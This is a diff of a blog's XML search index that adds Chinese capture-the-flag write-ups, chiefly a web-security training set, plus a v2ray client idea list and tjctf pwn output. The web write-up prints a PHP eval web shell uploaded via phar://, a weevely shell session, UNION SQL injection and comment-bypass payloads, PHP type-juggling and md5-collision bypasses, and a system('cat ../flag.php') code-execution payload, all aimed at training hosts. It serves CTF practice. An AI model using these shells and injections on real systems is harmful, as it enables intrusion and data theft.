@@ -1574,6 +1574,82 @@
       </tags>
   </entry>
   <entry>
+    <title>web安全训练</title>
+    <url>/2019/11/01/%E5%AE%89%E6%81%92%E8%AE%AD%E7%BB%83%E8%B5%9B/</url>
+    <content><![CDATA[<h1 id="安恒训练赛"><a href="#安恒训练赛" class="headerlink" title="安恒训练赛"></a>安恒训练赛</h1><h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><p><a href="http://114.55.36.69:8009/index.php?url=upload" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=upload</a></p><p>upload很明显的文件上传，查了下是php伪协议<br>看到zip于是猜测是phar://伪协议读取。</p><p>于是写个小马打包成zip文件传上去。</p><p>例如我写的是south.php。</p><p>然后压缩成south.zip，那么需要访问以下链接。</p><a id="more"></a>
+
+
+
+<?php
+    @eval($_POST['south']);
+    ?>
+
+<p>upload/5a722d46033ecd25d5ce0f13a0e7d8ec.zip/south<br><a href="http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test</a><br>随后连接小马，读到flag{a5aa012546a729eebaeaa768883beb23}。</p>
+<p>weevely generate <password> <path></path></password></p>
+<p>weevely generate test  ./test.php<br>生成小马</p>
+<p>然后压缩<br>zip test.zip test.php</p>
+<p>然后上传得到了个路径<br>/var/www/html/upload/db29bc3f2a4be40c202cd7de760f41d6.zip<br>/upload/30a95552d102e69505b406933e4332f5.zip</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/NoOne]</span><br><span class="line">└──╼ <span class="comment">#weevely http://114.55.36.69:8009/index.php?url=phar://upload/a382c5d906587c695f4408c0c7491560.zip/test test</span></span><br><span class="line">/usr/share/weevely/core/sessions.py:219: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please <span class="built_in">read</span> https://msg.pyyaml.org/load <span class="keyword">for</span> full details.</span><br><span class="line">  sessiondb = yaml.load(open(dbpath, <span class="string">'r'</span>).<span class="built_in">read</span>())</span><br><span class="line"></span><br><span class="line">[+] weevely 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Target:	c23cc37b6623:/var/www/html</span><br><span class="line">[+] Session:	/root/.weevely/sessions/114.55.36.69/index_4.session</span><br><span class="line">[+] Shell:	System shell</span><br><span class="line"></span><br><span class="line">[+] Browse the filesystem or execute commands starts the connection</span><br><span class="line">[+] to the target. Type :<span class="built_in">help</span> <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">weevely&gt; ls</span><br><span class="line">flag.php</span><br><span class="line">girl.jpg</span><br><span class="line">index.php</span><br><span class="line">upload</span><br><span class="line">upload.php</span><br><span class="line">c23cc37b6623:/var/www/html $ cat flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag&#123;a5aa012546a729eebaeaa768883beb23&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag</a></p>
+<h2 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h2><p>简单的md5 <a href="http://114.55.36.69:8004" target="_blank" rel="noopener">http://114.55.36.69:8004</a></p>
+<p>easy MD5 cracking</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--$_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>]--&gt;fail</span><br></pre></td></tr></table></figure>
+
+<p>没有md5?应该是只有部分代码</p>
+<p>脑补一下剩下的代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(($_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>])</span><br><span class="line">&amp;&amp;(md5($_POST[<span class="string">'data1'</span>])==md5($_POST[<span class="string">'data2'</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure>
+<p>这里用php弱类型绕过就好了<br>传错类型会变成null，所以可以绕过</p>
+<p><a href="https://zhuanlan.zhihu.com/p/30323499" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30323499</a></p>
+<p>data1[]=1 &amp;&amp; data2[]=2</p>
+<p>flag{401cf19d304e557349fecda18110c138}</p>
+<h2 id="简单的新闻搜索"><a href="#简单的新闻搜索" class="headerlink" title="简单的新闻搜索"></a>简单的新闻搜索</h2><p>简单的新闻搜索网站 <a href="http://114.55.36.69:8010" target="_blank" rel="noopener">http://114.55.36.69:8010</a></p>
+<p>小知识点：union需要前面的列数跟后面的列数相同，所以少了用数字补</p>
+<p>burp</p>
+<p>注入表名</p>
+<p>word=1%’ union select 1,2,table_name from information_schema.tables where table_schema=database()–  &amp;number=5</p>
+<p>注入得到列名</p>
+<p>word=1%’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’admin’–  &amp;number=5</p>
+<p>得到flag<br>word=1%’ union select 1,2,flag from admin–  &amp;number=5</p>
+<h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。靶机：<a href="http://114.55.36.69:8022" target="_blank" rel="noopener">http://114.55.36.69:8022</a></p>
+<p>当传入A.A、A[A或者A A时，PHP的$GET函数会自动将[.和空格转为_<br>这道题测试+也是可以绕过<br>数组大于任意的数字，字符串中如果没有数字，则==0</p>
+<p>A.A[]=1</p>
+<h2 id="md5-crack"><a href="#md5-crack" class="headerlink" title="md5 crack"></a>md5 crack</h2><p>fastcoll.exe -p 1.txt -o 1.bin 2.bin</p>
+<p>py读取二进制流在urlencode一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">f1 = open(<span class="string">'1.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">f2 = open(<span class="string">'2.bin'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'data1'</span>:f1,</span><br><span class="line">    <span class="string">'data2'</span>:f2</span><br><span class="line">&#125;</span><br><span class="line">print(urllib.parse.quote(f1))</span><br><span class="line">print(urllib.parse.quote(f2))</span><br><span class="line">flag = requests.post(<span class="string">"http://114.55.36.69:8006"</span>, data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
+
+<p>然后通过burp或者py都可以直接获得flag</p>
+<p>这里用hackbar会变成二次url编码，然后会出问题</p>
+<h2 id="新的新闻搜索"><a href="#新的新闻搜索" class="headerlink" title="新的新闻搜索"></a>新的新闻搜索</h2><p>word=%’and 1=2 /<em>!32302union</em>/ /<em>!32302select</em>/ 1,2,flag from admin#&amp;number=5</p>
+<p>有点骚，这个操作，内联注释绕过，虽然不知道原理，还是学到了</p>
+<p>注释是c语言注释格式/* */  !和数字，这个数字不能太小</p>
+<p>。。flag不对。。</p>
+<h2 id="玩个蛇皮"><a href="#玩个蛇皮" class="headerlink" title="玩个蛇皮"></a>玩个蛇皮</h2><p>玩个蛇皮 <a href="http://114.55.36.69:8011" target="_blank" rel="noopener">http://114.55.36.69:8011</a><br>简单js执行命令即可</p>
+<h2 id="ddcms"><a href="#ddcms" class="headerlink" title="ddcms"></a>ddcms</h2><p>查看默认管理后端<br>弱口令，传小马，连上拿flag</p>
+<p>1de3ce6607a0f95as1861c4bbb3687b8</p>
+<h2 id="爱い窒息、痛"><a href="#爱い窒息、痛" class="headerlink" title="爱い窒息、痛"></a>爱い窒息、痛</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_POST[<span class="string">'pass'</span>]) ? trim($_POST[<span class="string">'pass'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="string">''</span>) &#123;</span><br><span class="line">    echologin();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    chkpass($a);</span><br><span class="line">    helloowner($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkpass</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], md5($a)) === <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">helloowner</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $b = gencodeurl($a);</span><br><span class="line">    $c = file_get_contents($b);</span><br><span class="line">    <span class="keyword">if</span> ($c == <span class="keyword">false</span>) &#123;</span><br><span class="line">        echofail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d = @json_decode($c, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($d[<span class="string">'f'</span>])) &#123;</span><br><span class="line">        echofail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $d[<span class="string">'f'</span>]($d[<span class="string">'d'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gencodeurl</span><span class="params">($a)</span> </span>&#123;</span><br><span class="line">    $e = md5(date(<span class="string">"Y-m-d"</span>));</span><br><span class="line">    <span class="keyword">if</span> (strlen($a) &gt; <span class="number">40</span>) &#123;</span><br><span class="line">        $f = substr($a, <span class="number">30</span>, <span class="number">5</span>);</span><br><span class="line">        $g = substr($a, <span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $f = <span class="string">'good'</span>;</span><br><span class="line">        $g = <span class="string">'web.com'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $b = <span class="string">'http://'</span> . $f . $g;</span><br><span class="line">    <span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echofail</span><span class="params">($h)</span> </span>&#123;</span><br><span class="line">    $i = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAzMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PHAgZXJyaWQ9IiVpZCUiPuKFoS3jgIDjgIDilbAg5b+r55yL44CB5pyJ54Gw5py644CB5Zyo5rK15aS05LiK54Gw5p2l54Gw5Y6755qE44CCPC9wPjxwIHN0eWxlPSJmb250LXNpemU6IDUwJTsiPjxhIGhyZWY9Imh0dHBzOi8vd3d3LmxvdmVzdG9wcGFpbi50a0BibG9nLnZ1bHNweS5jb20vIj7niLHjgYTnqpLmga/jgIHnl5s8L2E+IOS4k+eUqOWQjumXqDwvcD48L2JvZHk+PC9odG1sPg=='</span>;</span><br><span class="line">    <span class="keyword">echo</span> str_replace(<span class="string">'%id%'</span>, $h, base64_decode($i));</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echologin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $j = <span class="string">'PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0idXRmLTgiLz48dGl0bGU+54ix44GE56qS5oGv44CB55ebPC90aXRsZT48L2hlYWQ+PGJvZHkgc3R5bGU9IndpZHRoOiAyMGVtO21hcmdpbjogMWVtIGF1dG87dGV4dC1hbGlnbjogY2VudGVyOyI+PGZvcm0gYWNpdG9uPSIiIG1ldGhvZD0iUE9TVCI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzIiBwbGFjZWhvbGRlcj0icGFzcyI+PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0ic3VibWl0Ij48L2Zvcm0+PHAgc3R5bGU9ImZvbnQtc2l6ZTogNTAlOyI+PGEgaHJlZj0iaHR0cHM6Ly93d3cubG92ZXN0b3BwYWluLnRrQGJsb2cudnVsc3B5LmNvbS8iPueIseOBhOeqkuaBr+OAgeeXmzwvYT4g5LiT55So5ZCO6ZeoPC9wPjwvYm9keT48L2h0bWw+'</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode($j);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码审计，发觉可以命令执行</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'ip地址'</span>.ljust(<span class="number">15</span>, <span class="string">'/'</span>)</span><br><span class="line">addr = <span class="string">'a'</span>*<span class="number">10</span> + ip[<span class="number">-10</span>:] + <span class="string">'b'</span>*<span class="number">10</span> + ip[:<span class="number">5</span>] + <span class="string">"c"</span>*<span class="number">10</span></span><br><span class="line">print(addr)</span><br><span class="line">print(len(addr))</span><br><span class="line">md5 = hashlib.md5(addr.encode(<span class="string">'ascii'</span>)).hexdigest()</span><br><span class="line">print(md5)</span><br><span class="line">http_addr = <span class="string">"http://"</span> + addr</span><br><span class="line">print(http_addr)</span><br></pre></td></tr></table></figure>
+
+
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /upload/dama.php HTTP/1.1</span><br><span class="line">Host: 114.55.36.69:8020</span><br><span class="line">User-Agent:md5</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 64</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://114.55.36.69:8020/upload/dama.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">pass=aaaaaaaaaaxxxxxx///bbbbbbbbbbxxxxcccccccccc&amp;submit=submit</span><br></pre></td></tr></table></figure>
+
+
+<p>部署在服务器上，默认以80端口，这样就不用index.php了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"f"</span>=&gt;<span class="string">"system"</span>,</span><br><span class="line">    <span class="string">"d"</span>=&gt;<span class="string">"cat ../flag.php"</span></span><br><span class="line">);</span><br><span class="line">$url = json_encode($url);</span><br><span class="line"><span class="keyword">echo</span> $url;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web安全</category>
+        <category>练习</category>
+      </categories>
+      <tags>
+        <tag>web安全,练习</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>随便做的练习</title>
     <url>/2019/11/01/writeup-1-%E7%BB%83%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="writeup-1-练习"><a href="#writeup-1-练习" class="headerlink" title="writeup-1-练习"></a>writeup-1-练习</h1><h2 id="简单的re"><a href="#简单的re" class="headerlink" title="简单的re"></a>简单的re</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+0h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+60h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  _printf_chk(<span class="number">1L</span>L, <span class="string">"input:"</span>, envp);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v10);</span><br><span class="line">  v3 = <span class="number">34</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (<span class="keyword">int</span> *)&amp;v10;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = *v5;</span><br><span class="line">      ++v5;</span><br><span class="line">      v7 = ~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x80808080</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v7 );</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v7 &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(~v6 &amp; (v6 - <span class="number">16843009</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">      v5 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v5 + <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= (<span class="keyword">char</span> *)v5 - __CFADD__((_BYTE)v7, (_BYTE)v7) - <span class="number">3</span> - (<span class="keyword">char</span> *)&amp;v10 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *((_BYTE *)&amp;v10 + i) ^= v3++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;szCmp, &amp;v10, <span class="number">0x16</span>uLL) )</span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"right\n"</span>, v8);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    _printf_chk(<span class="number">1L</span>L, <span class="string">"wrong\n"</span>, v8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>
@@ -1593,6 +1669,39 @@
       </categories>
       <tags>
         <tag>pwn， 栈</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>v2ray_linux客户端构思</title>
+    <url>/2019/11/01/v2ray-change/</url>
+    <content><![CDATA[<h1 id="功能构思"><a href="#功能构思" class="headerlink" title="功能构思"></a>功能构思</h1><ol>
+<li>修改监听端口</li>
+<li>导入vmess</li>
+<li>指定配置文件替换</li>
+<li>界面输入配置进行更换</li>
+<li>多账号切换</li>
+<li>订阅更新</li>
+<li>修改配置</li>
+</ol><p>初步想法，做好后利用docker挂载/etc/v2ray目录，通过docker修改配置文件</p>]]></content>
+      <categories>
+        <category>linux</category>
+        <category>v2ray</category>
+      </categories>
+      <tags>
+        <tag>linux,v2ray,gui,客户端</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tjctf2019比赛</title>
+    <url>/2019/11/01/tjctf2019/</url>
+    <content><![CDATA[<h1 id="Printf"><a href="#Printf" class="headerlink" title="Printf"></a>Printf</h1><p>Welcome to the brand new Security Consultants Inc. portal!<br>What would you like to do?<br>1.) View the Team!<br>2.) Check the date.<br>3.) Sign up for our newsletter!<br>4.) Report a bug.<br>x.) Exit.<br>Thanks for signing up for our newsletter!<br>Please enter your email address below:<br>I have your email as:<br>sh;#                                                           �                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             �aaaaaaaJ `sh: 1: Is: not found<br>$<br>Great! I have your information down as:<br>Name: Evan Shi<br>sh: 1: Email:: not found<br>$ cat flag.txt<br>tjctf{p0lygl0t_m0r3_l1k3_p0lynot}$  </p>]]></content>
+      <categories>
+        <category>二进制</category>
+        <category>pwn</category>
+        <category>堆</category>
+      </categories>
+      <tags>
+        <tag>pwn， 堆</tag>
       </tags>
   </entry>
   <entry>
@@ -1760,115 +1869,6 @@ BK-&gt;fd = FD;</code></pre><p>}<br><a href="https://ctf-wiki.github.io/ctf-wiki
       </categories>
       <tags>
         <tag>pwn， 堆</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>v2ray_linux客户端构思</title>
-    <url>/2019/11/01/v2ray-change/</url>
-    <content><![CDATA[<h1 id="功能构思"><a href="#功能构思" class="headerlink" title="功能构思"></a>功能构思</h1><ol>
-<li>修改监听端口</li>
-<li>导入vmess</li>
-<li>指定配置文件替换</li>
-<li>界面输入配置进行更换</li>
-<li>多账号切换</li>
-<li>订阅更新</li>
-<li>修改配置</li>
-</ol><p>初步想法，做好后利用docker挂载/etc/v2ray目录，通过docker修改配置文件</p>]]></content>
-      <categories>
-        <category>linux</category>
-        <category>v2ray</category>
-      </categories>
-      <tags>
-        <tag>linux,v2ray,gui,客户端</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>tjctf2019比赛</title>
-    <url>/2019/11/01/tjctf2019/</url>
-    <content><![CDATA[<h1 id="Printf"><a href="#Printf" class="headerlink" title="Printf"></a>Printf</h1><p>Welcome to the brand new Security Consultants Inc. portal!<br>What would you like to do?<br>1.) View the Team!<br>2.) Check the date.<br>3.) Sign up for our newsletter!<br>4.) Report a bug.<br>x.) Exit.<br>Thanks for signing up for our newsletter!<br>Please enter your email address below:<br>I have your email as:<br>sh;#                                                           �                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             �aaaaaaaJ `sh: 1: Is: not found<br>$<br>Great! I have your information down as:<br>Name: Evan Shi<br>sh: 1: Email:: not found<br>$ cat flag.txt<br>tjctf{p0lygl0t_m0r3_l1k3_p0lynot}$  </p>]]></content>
-      <categories>
-        <category>二进制</category>
-        <category>pwn</category>
-        <category>堆</category>
-      </categories>
-      <tags>
-        <tag>pwn， 堆</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web安全训练</title>
-    <url>/2019/11/01/%E5%AE%89%E6%81%92%E8%AE%AD%E7%BB%83%E8%B5%9B/</url>
-    <content><![CDATA[<h1 id="安恒训练赛"><a href="#安恒训练赛" class="headerlink" title="安恒训练赛"></a>安恒训练赛</h1><h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><p><a href="http://114.55.36.69:8009/index.php?url=upload" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=upload</a></p><p>upload很明显的文件上传，查了下是php伪协议<br>看到zip于是猜测是phar://伪协议读取。</p><p>于是写个小马打包成zip文件传上去。</p><p>例如我写的是south.php。</p><p>然后压缩成south.zip，那么需要访问以下链接。</p><a id="more"></a>
-
-
-
-<?php
-    @eval($_POST['south']);
-    ?>
-
-<p>upload/5a722d46033ecd25d5ce0f13a0e7d8ec.zip/south<br><a href="http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=phar://upload/13d98388fbf7a0397de87ee365830df8.zip/test</a><br>随后连接小马，读到flag{a5aa012546a729eebaeaa768883beb23}。</p>
-<p>weevely generate <password> <path></path></password></p>
-<p>weevely generate test  ./test.php<br>生成小马</p>
-<p>然后压缩<br>zip test.zip test.php</p>
-<p>然后上传得到了个路径<br>/var/www/html/upload/db29bc3f2a4be40c202cd7de760f41d6.zip<br>/upload/30a95552d102e69505b406933e4332f5.zip</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/NoOne]</span><br><span class="line">└──╼ <span class="comment">#weevely http://114.55.36.69:8009/index.php?url=phar://upload/a382c5d906587c695f4408c0c7491560.zip/test test</span></span><br><span class="line">/usr/share/weevely/core/sessions.py:219: YAMLLoadWarning: calling yaml.load() without Loader=... is deprecated, as the default Loader is unsafe. Please <span class="built_in">read</span> https://msg.pyyaml.org/load <span class="keyword">for</span> full details.</span><br><span class="line">  sessiondb = yaml.load(open(dbpath, <span class="string">'r'</span>).<span class="built_in">read</span>())</span><br><span class="line"></span><br><span class="line">[+] weevely 3.7.0</span><br><span class="line"></span><br><span class="line">[+] Target:	c23cc37b6623:/var/www/html</span><br><span class="line">[+] Session:	/root/.weevely/sessions/114.55.36.69/index_4.session</span><br><span class="line">[+] Shell:	System shell</span><br><span class="line"></span><br><span class="line">[+] Browse the filesystem or execute commands starts the connection</span><br><span class="line">[+] to the target. Type :<span class="built_in">help</span> <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">weevely&gt; ls</span><br><span class="line">flag.php</span><br><span class="line">girl.jpg</span><br><span class="line">index.php</span><br><span class="line">upload</span><br><span class="line">upload.php</span><br><span class="line">c23cc37b6623:/var/www/html $ cat flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag&#123;a5aa012546a729eebaeaa768883beb23&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><a href="http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag" target="_blank" rel="noopener">http://114.55.36.69:8009/index.php?url=php://filter/convert.base64-encode/resource=flag</a></p>
-<h2 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h2><p>简单的md5 <a href="http://114.55.36.69:8004" target="_blank" rel="noopener">http://114.55.36.69:8004</a></p>
-<p>easy MD5 cracking</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--$_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>]--&gt;fail</span><br></pre></td></tr></table></figure>
-
-<p>没有md5?应该是只有部分代码</p>
-<p>脑补一下剩下的代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(($_POST[<span class="string">'data1'</span>]!=$_POST[<span class="string">'data2'</span>])</span><br><span class="line">&amp;&amp;(md5($_POST[<span class="string">'data1'</span>])==md5($_POST[<span class="string">'data2'</span>]))</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br></pre></td></tr></table></figure>
-<p>这里用php弱类型绕过就好了<br>传错类型会变成null，所以可以绕过</p>
-<p><a href="https://zhuanlan.zhihu.com/p/30323499" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/30323499</a></p>
-<p>data1[]=1 &amp;&amp; data2[]=2</p>
-<p>flag{401cf19d304e557349fecda18110c138}</p>
-<h2 id="简单的新闻搜索"><a href="#简单的新闻搜索" class="headerlink" title="简单的新闻搜索"></a>简单的新闻搜索</h2><p>简单的新闻搜索网站 <a href="http://114.55.36.69:8010" target="_blank" rel="noopener">http://114.55.36.69:8010</a></p>
-<p>小知识点：union需要前面的列数跟后面的列数相同，所以少了用数字补</p>
-<p>burp</p>
-<p>注入表名</p>
-<p>word=1%’ union select 1,2,table_name from information_schema.tables where table_schema=database()–  &amp;number=5</p>
-<p>注入得到列名</p>
-<p>word=1%’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’admin’–  &amp;number=5</p>
-<p>得到flag<br>word=1%’ union select 1,2,flag from admin–  &amp;number=5</p>
-<h2 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h2><p>大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有一种奇怪的特性，那就是当在捕杀猎物的时候，如果猎物发出惊讶的表情的时候，他们也会发出惊讶的表情来告诉猎物“你们快要死了”，然而这种特性并没什么用处。。。因为我编不下去了。。以上这个故事是我瞎编的。。。靶机：<a href="http://114.55.36.69:8022" target="_blank" rel="noopener">http://114.55.36.69:8022</a></p>
-<p>当传入A.A、A[A或者A A时，PHP的$GET函数会自动将[.和空格转为_<br>这道题测试+也是可以绕过<br>数组大于任意的数字，字符串中如果没有数字，则==0</p>
